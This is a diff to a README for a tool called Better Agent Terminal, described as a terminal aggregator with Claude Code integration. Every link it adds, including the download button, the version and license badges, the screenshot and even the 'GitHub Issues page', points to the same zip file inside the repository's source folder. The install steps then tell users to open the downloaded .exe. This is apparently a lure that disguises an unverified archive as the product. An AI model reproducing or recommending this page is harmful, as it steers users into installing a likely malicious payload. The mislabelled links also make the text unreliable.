@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download Latest Release](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip%20Latest%https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)
-![Version](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)
-![Platform](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip%20|%20macOS%20|%https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)
-![Electron](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)
-![License](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip%20Latest%https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)
+![Version](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)
+![Platform](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip%20|%20macOS%20|%https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)
+![Electron](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)
+![License](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip)
 
 **A cross-platform terminal aggregator with multi-workspace support and Claude Code integration**
 
@@ -17,7 +17,7 @@
 ## 📸 Screenshot
 
 <div align="center">
-<img src="https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip" alt="Better Agent Terminal Screenshot" width="800">
+<img src="https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip" alt="Better Agent Terminal Screenshot" width="800">
 </div>
 
 ---
@@ -36,7 +36,7 @@
 To start using Better Agent Terminal, follow these simple steps:
 
 1. **Download the Application**: 
-   - Click the button above or [visit this page to download](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip).
+   - Click the button above or [visit this page to download](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip).
   
 2. **Install**: 
    - For Windows: Open the `.exe` file you downloaded and follow the on-screen instructions.
@@ -51,7 +51,7 @@ To start using Better Agent Terminal, follow these simple steps:
 
 To get the latest version of Better Agent Terminal:
 
-- [Visit this page to download](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip) the software for your platform.
+- [Visit this page to download](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip) the software for your platform.
 - Choose the correct file for your operating system (Windows, macOS, or Linux).
 - Follow the installation instructions above.
 
@@ -79,7 +79,7 @@ A minimum of 4GB RAM and 200MB of free disk space is recommended for smooth perf
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, feel free to reach out. You can open an issue on the [GitHub Issues page](https://github.com/Grepsaw/better-agent-terminal/raw/refs/heads/main/plans/terminal_better_agent_v3.6.zip) for assistance.
+If you encounter any issues or have questions, feel free to reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Grepsaw/better-agent-terminal/main/src/stores/terminal-better-agent-1.8.zip) for assistance.
 
 --- 
 
